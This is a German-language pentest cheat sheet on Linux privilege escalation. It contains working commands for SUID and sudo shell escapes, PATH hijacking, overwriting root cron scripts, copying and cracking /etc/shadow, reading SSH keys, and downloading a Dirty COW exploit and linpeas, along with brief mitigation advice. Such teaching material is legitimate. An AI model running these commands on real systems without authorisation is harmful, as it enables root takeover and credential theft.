# Linux Privilege Escalation




## Inhaltsverzeichnis
- [Einleitung](#einleitung)
- [Phase 1. System Checks & Enumeration](#phase-1-system-checks--enumeration)
    - [System- und Benutzerinformationen](#system--und-benutzerinformationen)
    - [Dateisystem-Checks](#dateisystem-checks)
    - [Netzwerk- und Dienstinformationen](#netzwerk--und-dienstinformationen)
    - [Suche nach sensiblen Daten](#suche-nach-sensiblen-daten)
- [Phase 2: Techniken zur Privilege Escalation](#phase-2-techniken-zur-privilege-escalation)
    - [SUID- und SGID-Binaries](#suid--und-sgid-binaries)
    - [PATH-Hijacking und Shared Libraries](#path-hijacking-und-shared-libraries)
    - [Schwache Dateiberechtigungen](#schwache-dateiberechtigungen)
    - [Bekannte gefährliche SUIDs](#bekannte-gefährliche-suids)
    - [GTFOBins - SUID Missbrauch](#gtfobins---suid-missbrauch)
    - [Writable Cronjobs & Skripte](#writable-cronjobs--skripte)
    - [Kernel Exploits](#kernel-exploits)
    - [Passwort-Angriffe](#passwort-angriffe)
- [Exploitable Binaries & Schwachstellen](#exploitable-binaries--schwachstellen)
- [Exploit-Sammlung](#exploit-sammlung)
- [Tools zur Privilege Escalation](#tools-zur-privilege-escalation)
- [Verteidigung und Mitigation](#verteidigung-und-mitigation)
- [Haftungsausschluss](#haftungsausschluss)




## Einleitung

Diese Datei dient als strukturiertes Cheat Sheet zur **Privilege Escalation** auf Linux-Systemen im Rahmen von Post-Exploitation. Sie hilft Pentestern und Sicherheitsanalysten, systematisch nach Wegen zu suchen, um aus eingeschränkten Benutzerrechten Root-Rechte zu erlangen. **Ausschließlich für legale Schulungszwecke gedacht.**


```text
Grafik: Der Prozess der Privilege Escalation:

                                        +-------------------+
                                        |                   |
                                        |  Angreifer erhält |
                                        |  eingeschränkten  |
                                        |     Zugriff       |
                                        |                   |
                                        +----------+--------+
                                                   |
                                                   |
                             +---------------------+---------------------+
                             |                                           |
                             |                                           |
+----------------------------v------+                    +---------------v------------------+
|                                   |                    |                                  |
|   **Phase 1: Enumeration**        |                    |  **Phase 2: Exploitation**       |
|  - System & User Info             |                    |  - SUID Binaries                 |
|  - Dateisystem-Checks             |                    |  - Schwache Dateiberechtigungen  |
|  - Netzwerk & Services            |                    |  - Cronjobs                      |
|  - Prozesse & Cronjobs            |                    |  - Kernel Exploits               |
|  - Vertrauliche Daten suchen      |                    |  - uvm.                          |
|                                   |                    |                                  |
+----------------------------^------+                    +---------------v------------------+
                             |                                           |
                             |                                           |
                             +---------------------+---------------------+
                                                   |
                                                   |
                                        +----------+--------+
                                        |                   |
                                        |  **Root-Rechte**  |
                                        |    erlangt?       |
                                        |                   |
                                        +-------------------+
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Phase 1. System Checks & Enumeration
Eine gründliche Aufklärung des Systems ist die wichtigste Phase. Ohne umfassende Informationen sind die Erfolgsaussichten auf eine Privilege Escalation gering.

### System- und Benutzerinformationen
Sammle grundlegende Fakten über das System und deine aktuelle Benutzerumgebung.
```bash
# Zeigt Kernel-Informationen an (wichtig für Kernel-Exploits)
uname -a

# Zeigt die Betriebssystem-Distribution und -Version
cat /etc/os-release

# Zeigt die aktuelle Benutzer-ID, Gruppen und Berechtigungen
id

# Zeigt den Hostnamen des Systems
hostname

# Zeigt an, welche Befehle mit sudo ohne Passwort ausgeführt werden können
sudo -l

# Zeigt, in welchen Gruppen du Mitglied bist
groups
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Dateisystem-Checks
Suche nach Dateien mit abnormalen Berechtigungen oder nach SUID-Binaries.
```bash
# Sucht nach allen Dateien mit gesetztem SUID- oder SGID-Bit
find / -type f -perm /4000 2>/dev/null
find / -type f -perm /2000 2>/dev/null

# Sucht nach allen vom aktuellen Benutzer beschreibbaren Dateien
# 2>/dev/null blendet Fehlermeldungen aus
find / -writable -type f 2>/dev/null
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Netzwerk- und Dienstinformationen
Untersuche, welche Ports geöffnet sind und welche Dienste auf dem System laufen.

```bash
# Zeigt aktive Netzwerkverbindungen und offene Ports
ss -tuln

# Listet alle laufenden Dienste mit ihrem Status auf
systemctl list-units --type=service

# Überprüft die Mount-Optionen von NFS-Freigaben
cat /etc/exports
cat /etc/fstab
```
**Achtung:** Wenn eine NFS-Freigabe mit der Option `no_root_squash` gemountet ist, kann ein Angreifer eine SUID-Datei erstellen und ausführen, um Root-Rechte zu erlangen.

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Suche nach sensiblen Daten
Durchsuche das Dateisystem nach interessanten Dateien, die Zugangsdaten oder Konfigurationen enthalten könnten.

```bash
# Durchsucht alle Dateien nach Keywords wie 'password', 'key', 'cred'
grep -rni "password\|key\|cred" /home 2>/dev/null

# Prüft die SSH-Historie
cat ~/.bash_history
cat ~/.ssh/id_rsa

# Überprüft die .bash_history der anderen Benutzer
find /home/ -name ".bash_history" -type f -readable 2>/dev/null
```


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Phase 2: Techniken zur Privilege Escalation

Nach der Enumeration geht es darum, die gefundenen Schwachstellen gezielt auszunutzen.

### SUID- und SGID-Binaries
**SUID** (**Set User ID**) und **SGID** (**Set Group ID**) sind spezielle Dateiberechtigungen. Wenn das SUID-Bit gesetzt ist, wird ein Programm mit den Rechten des Dateieigentümers ausgeführt - unabhängig davon, wer es startet. Ist der Eigentümer `root`, wird das Programm als Root ausgeführt.

```text
Grafik: Funktionsweise des SUID-Bits
+------------------+           +-------------------+
| Benutzer (alice) |           |  Programm         |
+------------------+           |  Eigentümer: root |
          |                    |  Rechte: rwxr-xr-x|
          |  Startet           |  SUID-Bit: s      |
          v                    +-------------------+
+-------------------+                    ^
|  Programm wird    |                    |
|  mit root-Rechten |<-------------------+
|  ausgeführt!      |
+-------------------+
```

**GTFOBins** ist eine hervorragende Ressource, um SUID-Binaries zu finden, die sich missbrauchen lassen: [https://gtfobins.github.io/](https://gtfobins.github.io/).

**Beispiel:** Missbrauch von `find`
Wenn `find` als SUID-Binary konfiguriert ist, kann es zum Ausführen von Befehlen als Root missbraucht werden.

```bash
find . -exec /bin/sh -p \; -quit
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### PATH-Hijacking und Shared Libraries
Wenn ein Skript als Root läuft und einen Befehl ohne absoluten Pfad (`/usr/bin/ls`) aufruft, kann die PATH-Variable manipuliert werden, um ein bösartiges Skript auszuführen.

```text
Grafik: Das PATH-Hijacking
+-------------------------+           +-----------------------------+
|    Original-PATH        |           |   Angreifer erstellt        |
|  /usr/local/bin:/usr/bin|           |   /tmp/ls                   |
+-------------------------+           +-----------------------------+
          |                                        |
          |  Manipuliert zu...                     |  Fügt /tmp hinzu
          v                                        v
+--------------------------+           +-----------------------------+
|    Manipulierter PATH    |           |   Skript ruft 'ls' auf      |
|  /tmp:/usr/local/bin:... |           |   und führt /tmp/ls aus     |
+--------------------------+           +-----------------------------+
```

```bash
# Angreifer erstellt eine bösartige 'ls'-Datei
echo "/bin/bash -p" > /tmp/ls
chmod +x /tmp/ls

# Angreifer manipuliert die PATH-Variable
export PATH=/tmp:$PATH

# Das verwundbare Skript, das 'ls' als Root aufruft, führt nun unseren Code aus.
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### Schwache Dateiberechtigungen
Wenn wichtige Systemdateien die falschen Berechtigungen haben, kann das zu einem direkten Root-Zugriff führen.

- `passwd` und `shadow`: Wenn `etc/shadow` für normale Benutzer beschreibbar ist, kann man einen neuen Benutzer mit Root-Rechten anlegen.

- `etc/crontab`: Wenn die Konfigurationsdatei für Cronjobs beschreibbar ist, kann man einen eigenen Root-Cronjob hinzufügen.

- `etc/sudoers`: Wenn diese Datei beschreibbar ist, kann man sich selbst sudo-Rechte ohne Passwort gewähren.


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



### Bekannte gefährliche SUIDs:

```bash
/usr/bin/vim
/usr/bin/find
/usr/bin/nmap
/usr/bin/perl
/usr/bin/python
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### GTFOBins - SUID Missbrauch
**GTFOBins** ist eine hervorragende Ressource, um SUID-Binaries zu finden, die sich missbrauchen lassen: [https://gtfobins.github.io/](https://gtfobins.github.io/).


Beispiel (wenn `find` SUID ist):

```bash
find . -exec /bin/sh -p \; -quit
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Writable Cronjobs & Skripte
**Cronjobs** sind zeitgesteuerte Befehle. Wenn ein Cronjob als root läuft und das Skript, das er ausführt, für dich beschreibbar ist, kannst du den Inhalt ändern und eigenen Code ausführen.

```bash
# Zeigt die Liste der Cronjobs für den Benutzer root
crontab -l -u root

# Beispiel: Cronjob als root ändern
echo "/bin/bash -p" > /var/www/backup.sh

# crontab ausgeben
cat /etc/crontab    

# Suche nach Cronjobs, die als root laufen und beschreibbare Skripte ausführen
ls -la /etc/cron.*
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Kernel Exploits
Falls keine der einfacheren Methoden funktioniert, ist ein **Kernel-Exploit** oft der letzte Ausweg. Dies ist eine Schwachstelle im Kernel des Betriebssystems, die ausgenutzt wird, um Root-Rechte zu erlangen.

- **Kernel-Version ermitteln:** `uname -r`

- **Exploit finden:** Nutze Seiten wie **Exploit-DB** oder **GitHub**, um einen passenden Exploit für die Kernel-Version zu finden.

- **Exploit auf das Ziel kopieren:** Über `scp`, `wget` oder `curl`.

- **Kompilieren und Ausführen:** Kompiliere den Code (oft C-Code) und führe ihn aus.


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### Passwort-Angriffe
Wenn du Zugriff auf die gehashten Passwörter in `/etc/shadow` hast (z.B. weil die Datei falsch konfiguriert ist), kannst du diese Hashes offline knacken.

```bash
# Erstellt eine Kopie der /etc/shadow für eine Offline-Analyse
cp /etc/shadow /tmp/shadow.txt

# Nutze John the Ripper oder Hashcat, um die Hashes zu knacken
john /tmp/shadow.txt --wordlist=passwortliste.txt
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Exploitable Binaries & Schwachstellen

### PATH-Variable manipulieren

```bash
# Falls ein Skript ein nicht vollqualifiziertes Kommando wie 'ls' aufruft
# und root-Rechte hat:
export PATH=/tmp:$PATH
echo "/bin/sh" > /tmp/ls
chmod +x /tmp/ls
```


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Sudo ohne Passwort

```bash
# Wenn sudo -l sowas zeigt:
(root) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Exploit-Sammlung

* [https://www.exploit-db.com/](https://www.exploit-db.com/)
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

> **Wichtig:** Nicht jeder Exploit funktioniert auf jeder Version. Führe sie in isolierter Umgebung aus (VM).

Beispiel: Dirty COW (CVE-2016-5195)

```bash
wget https://www.exploit-db.com/raw/40616
# Kompilieren und ausführen, um Root-Zugriff zu erlangen
```


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Tools zur Privilege Escalation
Manuelle Enumeration ist wichtig, aber automatisierte Tools sparen viel Zeit.

| Tool                                                                        | Zweck                                              |
| --------------------------------------------------------------------------- | -------------------------------------------------- |
| [linpeas.sh](https://github.com/carlospolop/PEASS-ng)                       | Automatisiertes Enumeration-Skript                 |
| [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) | Zeigt Kernel-Exploits für das Zielsystem an        |
| [pspy](https://github.com/DominicBreuker/pspy)                              | Prozesse und Cronjobs ohne Root anzeigen           |


```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Verteidigung und Mitigation
Als IT-Sicherheitsexperte ist es wichtig, nicht nur Angriffsmethoden zu kennen, sondern auch zu wissen, wie man sich verteidigt.

- **Prinzip der geringsten Rechte (Least Privilege):** Gewähre Benutzern nur die absolut notwendigen Berechtigungen, um ihre Aufgaben zu erfüllen.

- **SUID-Auditing:** Prüfe und deaktiviere regelmäßig SUID-Bits auf Binaries, die Benutzer nicht benötigen.

- **Regelmäßiges Patching:** Halte das Betriebssystem und den Kernel stets auf dem neuesten Stand, um bekannte Schwachstellen zu schließen.


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** September 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---